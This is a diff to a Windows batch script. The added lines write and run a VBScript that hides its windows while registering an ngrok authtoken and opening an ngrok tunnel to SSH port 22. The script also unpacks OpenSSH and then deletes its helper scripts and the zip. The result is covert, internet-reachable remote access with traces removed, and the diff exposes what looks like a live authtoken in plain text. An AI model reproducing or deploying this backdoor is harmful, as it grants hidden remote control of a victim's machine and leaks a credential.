@@ -84,18 +84,38 @@ echo objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)>>run.vbs
 echo Set fso = Nothing>>run.vbs
 echo Set objShell = Nothing>>run.vbs
 
-timeout 4
+echo Set objShell = WScript.CreateObject("WScript.Shell")>run2.vbs
 
-start run.vbs
+echo Set oFSO = CreateObject("Scripting.FileSystemObject")>>run2.vbs
 
-timeout 4
+echo set objWShell = wScript.createObject("WScript.Shell")>>run2.vbs
 
-del run.vbs
+echo Set fso = CreateObject("Scripting.FileSystemObject")>>run2.vbs
+
+echo usrName = objWShell.expandEnvironmentStrings("%USERNAME%")>>run2.vbs
+
+echo objShell.Run "ngrok config add-authtoken 7zFPzj3u8MAQjqyJsMKWx_5otRYcmDfdQfq1PRTcSTe", vbhide >>run2.vbs
+
+echo objShell.Run "C:\temp\ngrok tcp 22", vbhide -force >>run2.vbs
+
+timeout 2
 
 cd C:\temp
 
-timeout 5
+start run.vbs
+
+timeout 2
 
 start down-init.vbs
+
+timeout 5
+
+start run2.vbs
+
+timeout 5
+
+del run2.vbs
+
+del run.vbs
 
 del OpenSSH-Win64.zip
